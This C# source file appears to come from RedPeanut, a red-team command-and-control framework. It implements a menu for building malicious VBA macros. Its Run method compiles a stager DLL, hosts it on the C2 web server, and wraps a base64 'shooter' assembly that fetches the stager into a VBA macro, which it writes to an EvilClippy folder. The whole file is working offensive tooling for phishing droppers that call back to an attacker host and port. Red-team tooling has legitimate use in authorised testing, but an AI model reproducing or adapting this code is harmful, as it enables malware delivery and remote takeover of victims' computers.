//
// Author: B4rtik (@b4rtik)
// Project: RedPeanut (https://github.com/b4rtik/RedPeanut)
// License: BSD 3-Clause
//

using System;
using System.Collections.Generic;
using static RedPeanut.Utility;
using System.IO;

namespace RedPeanut
{
    public class LauncherVBAManager : IMenu
    {
        public static Dictionary<string, string> mainmenu = new Dictionary<string, string>
        {
            { "set filename", "Set Domain" },
            { "set lhost", "Set lhost" },
            { "set lport", "Set lport" },
            { "set profile", "Set profile" },
            { "run", "Execute module" },
            { "options", "Print current config" },
            { "info", "Print help" },
            { "back", "Back to lateral menu" }
        };

        public void RePrintCLI()
        {
            Utility.RePrintCLI(agent, modulename);
            return;
        }

        IAgentInstance agent = null;
        string modulename = "vbamacro";
        string filename = null;
        string lhost = null;
        int lport = 0;
        int profile = 0;

        bool exit = false;

        public LauncherVBAManager()
        {

        }

        public LauncherVBAManager(IAgentInstance agent)
        {
            this.agent = agent;
        }

        public void Execute()
        {
            exit = false;
            string input;
            SetAutoCompletionHandler(mainmenu);
            do
            {
                input = RedPeanutCLI(agent, modulename);
                LauncherMenu(input);
            } while (!exit);
        }

        private void LauncherMenu(string input)
        {
            string f_input = ParseSelection(input);

            if (!string.IsNullOrEmpty(input))
            {
                if (mainmenu.ContainsKey(f_input.TrimEnd()))
                {
                    switch (f_input.TrimEnd())
                    {
                        case "set filename":
                            filename = GetParsedSetString(input);
                            break;
                        case "set lhost":
                            lhost = GetParsedSetString(input);
                            break;
                        case "set lport":
                            lport = GetParsedSetInt(input);
                            break;
                        case "set profile":
                            profile = GetParsedSetInt(input);
                            break;
                        case "run":
                            Run();
                            break;
                        case "options":
                            PrintCurrentConfig();
                            break;
                        case "info":
                            PrintOptions("info", mainmenu);
                            break;
                        case "back":
                            Program.GetMenuStack().Pop();
                            exit = true;
                            return;
                        default:
                            Console.WriteLine("We had a woodoo");
                            break;
                    }
                }
                else
                {
                    PrintOptions("Command not found", mainmenu);
                }
            }
        }


        private void Run()
        {
            List<string> args = new List<string>();
            try
            {
                if (string.IsNullOrEmpty(filename) || string.IsNullOrEmpty(lhost) || lport < 1 || profile < 1)
                {
                    return;
                }
                else
                {
                    // Parse .cs sorce and repalce variable
                    string folderrpath = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, TEMPLATE_FOLDER);
                    if (Program.GetC2Manager().GetC2Server().GetProfiles().ContainsKey(profile))
                    {
                        //Building agent
                        ListenerConfig conf = new ListenerConfig("", lhost, lport, Program.GetC2Manager().GetC2Server().GetProfile(profile), profile);
                        string source = File.ReadAllText(Path.Combine(folderrpath, STAGER_TEMPLATE));
                        source = Replacer.ReplaceAgentProfile(source, RedPeanut.Program.GetServerKey(),35, conf);
                        string outfilename = RandomAString(10, new Random()) + ".dll";
                        Builder.GenerateDll(source, outfilename, 35);
                    
                        //Add resource to webserver
                        C2Manager c2manager = Program.GetC2Manager();
                        c2manager.GetC2Server().RegisterWebResource(outfilename, new WebResourceInstance(null, outfilename));

                        string uricontent = Program.GetC2Manager().GetC2Server().GetProfile(profile).ContentUri.TrimStart('/');
                        if (!uricontent.EndsWith("/"))
                            uricontent += "/";

                        string resourcepath = uricontent + outfilename;

                        //Build shooter assembly
                        source = File.ReadAllText(Path.Combine(folderrpath, SHOOTER_TEMPLATE));
                        source = Replacer.ReplaceAgentShooter(source, resourcepath, conf);

                        string assemblyBase64 = Builder.GenerateDllBase64(source, RandomAString(10,new Random()) + ".dll",35);
                    
                        VBAGenerator gen = new VBAGenerator(assemblyBase64, null);

                        //Write file to dest dir
                        string destdir = Path.Combine(Directory.GetCurrentDirectory(), WORKSPACE_FOLDER, EVILCLIPPY_FOLDER);
                        File.WriteAllText(Path.Combine(destdir, filename), gen.GetScriptText());
                        Console.WriteLine("[*] {0} Created", Path.Combine(destdir, filename));
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("[*] Error running task build {0}", e.Message);
                return;
            }
}


        private void PrintCurrentConfig()
        {
            Dictionary<string, string> properties = new Dictionary<string, string>
            {
                { "filename", filename },
                { "lhost", lhost },
                { "lport", lport.ToString() },
                { "profile", profile.ToString() }
            };

            Utility.PrintCurrentConfig(modulename, properties);
        }
    }
}
